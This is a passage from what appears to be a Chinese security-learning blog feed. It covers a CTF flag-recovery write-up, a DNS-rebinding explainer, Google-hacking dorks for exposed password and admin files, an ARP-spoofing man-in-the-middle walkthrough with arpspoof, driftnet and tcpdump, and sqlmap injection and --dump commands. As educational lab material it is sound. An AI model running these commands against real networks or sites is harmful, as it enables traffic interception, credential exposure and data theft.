sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里并没有有关flag的信息，真正的flag在<code>sub_1400110FF</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140016760</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a1,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a2,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a3,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a4,</span></span></span><br><span class="line"><span class="function"><span class="params">        _BYTE *a5,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a6,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a7,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a8,</span></span></span><br><span class="line"><span class="function"><span class="params">        _BYTE *a9,</span></span></span><br><span class="line"><span class="function"><span class="params">        _DWORD *a10,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> *a11,</span></span></span><br><span class="line"><span class="function"><span class="params">        __int64 a12)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+1E8h] [rbp+1C8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+264h] [rbp+244h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+264h] [rbp+244h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+284h] [rbp+264h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+2A4h] [rbp+284h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+2C4h] [rbp+2A4h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+2E8h] [rbp+2C8h]</span></span><br><span class="line"></span><br><span class="line">  sub_140011690(&amp;unk_14002D06A);</span><br><span class="line">  v14 = (_BYTE *)sub_1400112AD(<span class="number">14</span>i64);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a2);</span><br><span class="line">  v14[<span class="number">9</span>] = *a5;</span><br><span class="line">  v14[<span class="number">2</span>] = v14[<span class="number">9</span>];</span><br><span class="line">  v14[<span class="number">1</span>] = *(_BYTE *)(a1 + <span class="number">10</span>) - <span class="number">12</span>;</span><br><span class="line">  v14[<span class="number">10</span>] = *(_BYTE *)(a3 + <span class="number">5</span>) - <span class="number">56</span>;</span><br><span class="line">  v14[<span class="number">7</span>] = *(_BYTE *)(a6 + <span class="number">15</span>) - <span class="number">10</span>;</span><br><span class="line">  v14[<span class="number">13</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a8 + <span class="number">3</span>) + <span class="number">3</span>));</span><br><span class="line">  v14[<span class="number">3</span>] = *(_BYTE *)(a2 + <span class="number">1</span>) + <span class="number">4</span>;</span><br><span class="line">  v14[<span class="number">11</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a7 + <span class="number">7</span>) - <span class="number">14</span>));</span><br><span class="line">  v14[<span class="number">4</span>] = v14[<span class="number">7</span>];</span><br><span class="line">  *v14 = <span class="built_in">tolower</span>((<span class="keyword">char</span>)(*a9 + <span class="number">31</span>));</span><br><span class="line">  v14[<span class="number">8</span>] = <span class="built_in">toupper</span>(*(<span class="keyword">char</span> *)(a8 + <span class="number">27</span>));</span><br><span class="line">  v14[<span class="number">5</span>] = <span class="built_in">toupper</span>((<span class="keyword">char</span>)(*(_BYTE *)(a4 + <span class="number">13</span>) - <span class="number">16</span>));</span><br><span class="line">  v14[<span class="number">6</span>] = v14[<span class="number">3</span>];</span><br><span class="line">  v14[<span class="number">12</span>] = a5[<span class="number">6</span>] - <span class="number">39</span>;</span><br><span class="line">  v12 = sub_1400180A0(<span class="number">0</span>i64);</span><br><span class="line">  srand(v12);</span><br><span class="line">  v15 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = rand() % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">7</span> || v18 )</span><br><span class="line">    &#123;</span><br><span class="line">      *a10 += v18 * v15;</span><br><span class="line">      v15 *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = rand() % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j != <span class="number">7</span> || v20 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j )</span><br><span class="line">        *(_QWORD *)(a12 + <span class="number">8</span>i64 * *a11) += v20 * v16;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_QWORD *)(a12 + <span class="number">8</span>i64 * *a11) = v20;</span><br><span class="line">      v16 *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --j;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_1400112E9(<span class="string">&quot;%s %d\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)a3, *(_QWORD *)(a12 + <span class="number">8</span>i64 * (*a11)++));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的flag在v14变量中，是根据已有的变量变换得到的</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="string">&quot;Sloth&#x27;s lottery shop is open!&quot;</span></span><br><span class="line">v4 = <span class="string">&quot;You&#x27;re our first customer!&quot;</span></span><br><span class="line">v5 = <span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span></span><br><span class="line">v6 = <span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span></span><br><span class="line">v7 = <span class="string">&quot;1.buy a lottery ticket&quot;</span></span><br><span class="line">v8 = <span class="string">&quot;2.Check to see if you won&quot;</span></span><br><span class="line">v9 = <span class="string">&quot;3.join us&quot;</span></span><br><span class="line">v10 = <span class="string">&quot;4.Take a sneak peek at the flag&quot;</span></span><br><span class="line">v11 = <span class="string">&quot;5.exit&quot;</span></span><br><span class="line">v13 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>]</span><br><span class="line">v15 = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line">v14 = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line">V14 = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line"></span><br><span class="line">V14[<span class="number">9</span>] = v7[<span class="number">0</span>]</span><br><span class="line">V14[<span class="number">2</span>] = V14[<span class="number">9</span>]</span><br><span class="line">V14[<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v3[<span class="number">10</span>])<span class="number">-12</span>)</span><br><span class="line">V14[<span class="number">10</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5[<span class="number">5</span>]) - <span class="number">56</span>)</span><br><span class="line">V14[<span class="number">7</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v8[<span class="number">15</span>]) - <span class="number">10</span>)</span><br><span class="line">V14[<span class="number">13</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v10[<span class="number">3</span>]) + <span class="number">3</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">3</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v4[<span class="number">1</span>]) + <span class="number">4</span>)</span><br><span class="line">V14[<span class="number">11</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v9[<span class="number">7</span>])<span class="number">-14</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">4</span>] = (V14[<span class="number">7</span>])</span><br><span class="line">V14[<span class="number">0</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v11[<span class="number">0</span>])+<span class="number">31</span>).lower()<span class="comment">#l</span></span><br><span class="line">V14[<span class="number">8</span>] = (v10[<span class="number">27</span>]).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">5</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v6[<span class="number">13</span>])<span class="number">-16</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">6</span>] = V14[<span class="number">3</span>]</span><br><span class="line">V14[<span class="number">12</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v7[<span class="number">6</span>])<span class="number">-39</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(V14))</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;th1s_Is_F14G:D&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS重绑定</title>
      <link href="2022/04/17/dns_rebinding_attack/"/>
      <url>2022/04/17/dns_rebinding_attack/</url>
      
        <content type="html"><![CDATA[<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p>DNS重绑定指的是在用户访问域名时更改域名指向的IP从而令用户访问指定IP的攻击手法</p><hr><p><strong>DNS</strong>：由于网络传输需要IP地址，故需要DNS（Domian Name Server）用于查询给定域名指向的IP</p><p><strong>同源策略</strong>（The Same-origin Policy）：</p><blockquote><p>The same-origin policy restricts which network messages one origin can send to another. For example, the same-origin policy allows inter-origin HTTP requests with GET and POST methods but denies inter-origin PUT and DELETE requests. Additionally, origins can use custom HTTP headers when sending requests to themselves but cannot use custom headers when sending requests to other origins.</p><p>The restrictions on reading information received from other origins is also somewhat subtle. For example, the HTML &lt;script&gt; element can execute content retrieved from foreign origins, which means web sites should not rely on the same-origin policy to protect the confidentiality of information in a format that happens to parse as script (e.g., JavaScript source files, JSON format, JSONP services, or <a href="http://www.thinkfu.com/blog/?p=15">JavaScript/gif polyglots</a>). For all such resources, no loss of security would result (and much flexibility would be gained) from adding the Access-Control-Allow-Origin:* header to all responses.</p></blockquote><p>以上解释来自于<a href="https://www.w3.org/Security/wiki/Same_Origin_Policy">Same Origin Policy - Web Security (w3.org)</a></p><p><a href="https://www.helloimg.com/image/RnPgwo"><img src="https://www.helloimg.com/images/2022/04/17/RnPgwo.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/17/RnPgwo.png" srcset="data:image/png;base64,666" alt="RnPgwo.png"></a></p><p>简单来说，为了防止淘宝网带着你的账户信息访问京东，需要同源策略来限制不同网站之间的访问规范</p><hr><p>​    可以看出同源的要求是“协议+端口+域名/ip”，而如果以域名访问网站（通常的做法）时同源策略就变成了“协议+端口+域名”这就给了DNS重绑定攻击实现的可能</p><p>要实现DNS重绑定攻击，攻击者需要具备以下条件：</p><ul>    <li>诱使用户点击给定链接（钓鱼邮件、钓鱼短信、社工等）</li>    <li>可控的DNS服务器（自己搭建一个或者抢一个）</li></ul><p>​    DNS重绑定攻击会诱使用户访问一个域名，在用户第一次访问时以正常的IP进行通信，并且在返回的DNS查询结果中将TTL设置为1或其他比较小的数字，在诱使用户以点击等行为构造好恶意请求时，攻击者一般会修改DNS服务器上该域名指向的IP，从而将恶意请求发送至攻击者指定的IP；</p><blockquote><p>TTL（Time To Live）指的是dns查询结果的有效时间，通过修改TTL为一个较小的值从而实现受害者与DNS服务器的频繁通信，从而保证在修改域名指向的IP时能立即生效</p></blockquote><hr><p>​    易受攻击的设备：一般是位于内网的智能家居设备，由于攻击者无法从外网访问受害者的内网，故以此种攻击伪造身份访问内网（SSRF）；比如恒温器，若在一个只有老人的场所中，这种攻击往往是致命的</p><blockquote><p>quote<br><a href="https://www.w3.org/Security/wiki/Same_Origin_Policy">Same Origin Policy - Web Security (w3.org)</a><br><a href="https://zhuanlan.zhihu.com/p/45583472">利用DNS重绑定攻击专用网络 - 知乎 (zhihu.com)</a><br><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击 - 先知社区 (aliyun.com)</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleHacking</title>
      <link href="2022/04/09/google_hacking/"/>
      <url>2022/04/09/google_hacking/</url>
      
        <content type="html"><![CDATA[<h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p>Google hacking是一系列用于高效运用搜索引擎的技巧，也可以用于测试漏洞等用处</p><p>A and B</p><p>逻辑与，用于查找同时包含A和B的内容</p><p>A or B</p><p>逻辑或，用于查找包含A或包含B或同时包含A和B的内容</p><p>A -B</p><p>逻辑非，用于查找A但不包含B的内容</p><p>“xxx yyy”</p><p>完整匹配，用于查找带有完整xxx yyy的内容</p><p>site:xxx.com yyy</p><p>指定搜索范围，用于搜索特定范围（xxx.com）内有关yyy的内容</p><p>filetype:txt xxx</p><p>指定搜索文件类型，用于搜索有关xxx的txt文件</p><p>inurl:aaa</p><p>搜索匹配网址中带aaa的内容</p><p>allinurl: aaa bbb</p><p>与inurl相似，只不过可以指定多个关键词</p><p>intext:aaa xxx</p><p>搜索匹配网页正文中带aaa的且有关xxx的内容</p><p>intitle:xxx</p><p>搜索匹配网页的标题中包含xxx的内容</p><p>xxx*</p><p>使用通配符*搜索有关以xxx为前缀的内容</p><p>link:xxx.com</p><p>返回所有指向xxx.com的网页</p><p>related:xxx.com</p><p>返回所有与xxx.com相似的网页（指布局相似）</p><p>cache:xxx.com [yyy]</p><p>返回搜索引擎有关xxx.com的缓存，如果加上关键词，则网页中的关键词会被高亮</p><p>info:<a href="http://www.xxx.com/">www.xxx.com</a></p><p>返回有关站点<a href="http://www.xxx.com的相关信息/">www.xxx.com的相关信息</a></p><p>define:xxx</p><p>返回有关xxx的定义</p><p>Index of /xxx</p><p>返回允许当作目录访问的网页</p><h2 id="一些技巧："><a href="#一些技巧：" class="headerlink" title="一些技巧："></a>一些技巧：</h2><h3 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h3><p>site:xx.com intext:管理</p><p>site:xx.com inurl:login</p><p>site:xx.com intitle:后台</p><h3 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h3><p>site:xx.com filetype:asp</p><p>site:xx.com filetype:php</p><p>site:xx.com filetype:jsp</p><p>site:xx.com filetype:aspx</p><h3 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h3><p>site:xx.com inurl:file</p><p>site:xx.com inurl:load</p><h3 id="查看可访问目录"><a href="#查看可访问目录" class="headerlink" title="查看可访问目录"></a>查看可访问目录</h3><p>index of /admin</p><p>index of /passwd</p><p>index of /password</p><p>index of /mail</p><p>“index of /“ +passwd</p><p>“index of /“ +password.txt</p><p>“index of /“ +.htaccess</p><p>“index of /root”</p><p>“index of /cgi-bin”</p><p>“index of /logs”</p><p>“index of /config”</p><blockquote><p>quote<br><a href="https://blog.csdn.net/weixin_51339377/article/details/124005136">Google-Hacking 语法笔记_Simon_Smith的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_35733751/article/details/105258082">2-信息收集—Google hacking_songly_的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84029809">信息收集之Google Hacking的简单用法_谢公子的博客-CSDN博客_google hacking</a></p><p><a href="https://blog.csdn.net/huweiliyi/article/details/105442118">Google Hacking使用详解_Teacher.Hu的博客-CSDN博客_google hacking</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arp欺骗初次尝试</title>
      <link href="2022/04/03/arp_cheat/"/>
      <url>2022/04/03/arp_cheat/</url>
      
        <content type="html"><![CDATA[<h2 id="ARP欺骗是什么"><a href="#ARP欺骗是什么" class="headerlink" title="ARP欺骗是什么"></a>ARP欺骗是什么</h2><p>ARP欺骗（ARP spoofing），又称ARP毒化（ARP poisoning，网络上多译为ARP病毒）或ARP攻击，是针对<a href="https://baike.baidu.com/item/%E4%BB%A5%E5%A4%AA%E7%BD%91">以太网</a><a href="https://baike.baidu.com/item/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE">地址解析协议</a>（<a href="https://baike.baidu.com/item/ARP">ARP</a>）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取<a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>上的数据包甚至可篡改数据包，且可让网络上特定计算机或所有计算机无法正常连线。</p><p>以上来自百度百科</p><h2 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h2><p>大概原理就是在每台用于上网的机器中都会有一张叫arp缓存表的东西，里边记录了ip地址与mac地址（物理地址）的映射关系</p><p>这张表的形成过程如下：</p><p>假设现在我要与ip地址为192.168.1.2的主机通信，我就向局域网内的所有主机广播消息“谁是192.168.1.2 ？”，这时如果该ip的主机收到了广播，就会向发出广播的主机回应“192.168.1.2是我，我的mac地址是xxx”，然后发出广播的主机就将该ip和该mac地址记录到本机的arp缓存表中</p><p>而arp欺骗要做的，就是假装自己是某一台被请求的主机，把自己的mac地址与被假装主机的ip绑定起来记录在别人的arp缓存表中；由于网络的实际传输是通过mac地址进行寻址的，这样所有发送到被假装主机的信息都会通过mac地址发送到恶意主机上</p><h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h2><p>设备：手机一台，电脑一台，树莓派一个</p><p>说明：</p><ul>    <li>手机充当受害者（ip：192.168.137.116）</li>    <li>电脑充当网关（开热点 ip：192.168.137.1）</li>    <li>树莓派作为攻击机器（ip：192.168.137.66）</li></ul><p>使用程序：arpspoof(需要安装dsniff与ssldump)，tcpdump，driftnet</p><blockquote><p>为什么需要树莓派？</p><p>本来打算用vmware模拟所有的主机的，但是由于局域网的配置问题无法用vmware模拟所有机器，模拟一部分的话又会因为局域网的问题导致虚拟机与物理机无法进行正常通信，所以就拿出了我吃灰多年的原生树莓派</p></blockquote><p>首先使用nmap扫描受害者</p><p><a href="https://www.helloimg.com/image/RJkmoX"><img src="https://www.helloimg.com/images/2022/04/03/RJkmoX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkmoX.png" srcset="data:image/png;base64,666" alt="RJkmoX.png"></a></p><p>确定了受害者的ip之后使用命令</p><p>arpspoof -i [网卡（此处为wlan0）] -t [目标ip] [网关ip]</p><p>进行欺骗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i wlan0 -t 192.168.137.116 192.168.137.1</span><br></pre></td></tr></table></figure><p>如果仅仅只是想对目标主机进行断网操作的话无需其他操作，但是如果想进行双向的欺骗（中间人攻击），就必须打开树莓派的转发功能，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>然后再打开另一个窗口，安装driftnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install driftnet</span><br><span class="line">sudo driftnet -i [监听网卡] -a -d [截取的图片的存放目录]</span><br></pre></td></tr></table></figure><p>这样就可以获取受害者此时的图片了</p><p><a href="https://www.helloimg.com/image/RJkHXz"><img src="https://www.helloimg.com/images/2022/04/03/RJkHXz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkHXz.png" srcset="data:image/png;base64,666" alt="RJkHXz.png"></a></p><blockquote><p>如果用树莓派查看图片不方便，可以打开80端口，把图片放到网站根目录下再从浏览器访问</p></blockquote><p>实际上在我进行实验时，截图获取得并不是很顺利，所以我选择了另外一种获取通信信息的方式——tcpdump</p><p>在arpspoof命令运行的时候，由于受害者与网关的所有通信都会经过攻击机的网卡，故我们可以用tcpdump来获取本地网卡接收到的信息。命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i wlan0 -s 0 -w e.cap</span><br></pre></td></tr></table></figure><p>wlan0是网卡，e.cap是抓包存放的文件名称，回车之后便开始抓包，等到什么时候觉得差不多了就crtl+C停止就行，此时在当前目录下应该会出现刚刚抓包的文件（此处为e.cap），可以使用以下命令读取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -A -r e.cap </span><br></pre></td></tr></table></figure><p>-A是以ascii形式显示 -r后面的是要打开的文件，除了这种打开方式，还有类似过滤器的功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -n dst host 119.91.135.95 -r e.cap</span><br></pre></td></tr></table></figure><p>该命令过滤了ip为119.91.135.95的通信信息并显示在屏幕上</p><p><a href="https://www.helloimg.com/image/RJkDzS"><img src="https://www.helloimg.com/images/2022/04/03/RJkDzS.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkDzS.png" srcset="data:image/png;base64,666" alt="RJkDzS.png"></a></p><p>以上是传输过程中截取的信息</p><blockquote><p>quote<br><a href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97/2805503">ARP欺骗_百度百科 (baidu.com)</a></p><p><a href="https://www.cnblogs.com/longliz/p/15040093.html">kaili linux使用arpspoof进行arp欺骗 - 闻所未闻 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/mr__sheng/article/details/123757426">ARP–利用arpspoof和driftnet工具进行arp欺骗_mr_xiuk的博客-CSDN博客_arpspoof</a></p><p><a href="https://blog.51cto.com/u_14354846/2408291">kali linux操作系统中TCPDUMP详细使用方法_隔壁老湿的技术博客_51CTO博客</a></p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/104569308">Kali渗透-ARP断网攻击与监听_Tr0e的博客-CSDN博客_kali局域网渗透监控</a></p><p><a href="https://www.cnblogs.com/0day-li/p/6059297.html">kali linux下的arp攻击 - 逗比大师 - 博客园 (cnblogs.com)</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap基本操作</title>
      <link href="2022/03/29/sqlmap/"/>
      <url>2022/03/29/sqlmap/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.helloimg.com/image/RqDeM6"><img src="https://www.helloimg.com/images/2022/03/29/RqDeM6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/29/RqDeM6.png" srcset="data:image/png;base64,666" alt="RqDeM6.png"></a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux-Mac-OS"><a href="#Linux-Mac-OS" class="headerlink" title="Linux / Mac OS"></a>Linux / Mac OS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>安装git-bash之后在选定目录下右键打开git-bash窗口运行上述命令即可</p><p>下载地址：</p><p><a href="https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe">https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h<span class="comment"># 获取常见选项</span></span><br><span class="line">python sqlmap.py -hh<span class="comment"># 获取所有选项</span></span><br><span class="line">python sqlmap.py -u www.example.com <span class="comment"># 检测GET注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch  <span class="comment"># 使用默认选项（不用手动选择y/n）</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch --dbs --tables --columns<span class="comment"># 返回数据库/表/列</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch -D xxx -T xxx -C xxx<span class="comment"># 指定数据库/表/列</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch --dump   <span class="comment"># 直接返回数据库内容</span></span><br></pre></td></tr></table></figure><p><strong>注：如果是在Linux系统下，python命令可能调用的是python2，如果报错可将python换为python3</strong></p><p>​        <strong>如果有其他报错，尝试将网址等参数用双引号包裹</strong></p><p>​        <strong>Windows下可在命令提示符或powershell下运行</strong></p><ul>    <li>在返回数据库/表/列时，可只指定一项</li>    <li>在指定数据库/表/列时，也可只指定一项</li>    <li>一般将dump选项和上述命令结合，直接返回注入结果</li></ul><h2 id="更多玩法"><a href="#更多玩法" class="headerlink" title="更多玩法"></a>更多玩法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -m 1.txt<span class="comment"># 从文件中导入url</span></span><br><span class="line">python sqlmap.py -r res.txt<span class="comment"># 从文件中导入http响应</span></span><br><span class="line">python sqlmap.py -l burp.txt<span class="comment"># 从文件中导入burp抓包文件</span></span><br><span class="line">python sqlmap.py -u www.example.com  --data=<span class="string">&quot;id=1&quot;</span>  <span class="comment"># 使用POST注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 2  <span class="comment"># 使用2级注入，检测cookie注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 3  <span class="comment"># 使用3级注入，检测referer注入和USER-AGENT注入</span></span><br><span class="line">python 